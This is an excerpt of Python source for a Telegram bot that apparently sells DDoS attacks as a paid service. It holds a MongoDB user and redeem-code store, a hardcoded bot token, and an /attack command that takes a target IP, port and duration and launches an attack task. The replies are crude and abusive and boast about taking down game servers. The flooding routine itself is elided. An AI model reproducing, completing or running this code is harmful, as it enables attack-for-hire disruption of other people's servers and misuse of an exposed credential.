...
db = client['VipDatabase']
users_collection = db['users']
redeem_codes_collection = db['redeem_codes']

TELEGRAM_BOT_TOKEN = '7518143233:AAFUjupLVxy17KnykUPVilrHxLQFhc9Btk4'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @Mafia_033_082_120! /get_id*", parse_mode='Markdown')
        return
    message = (
        "*WELCOME 🤗 TO MAFIA PAID DDOS *\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀sever ki chudayi @Mafia_033_082_120 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @Mafia_033_082_120!*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    text=(
        ...
        f"*🔥chudai chalu h feedback bhej dena @Mafia_033_082_120💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def BadnamBadshah(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @Mafia_033_082_120!*", parse_mode='Markdown')
...
def main():
    ...
    application.add_handler(CommandHandler("get_id", BadnamBadshah))
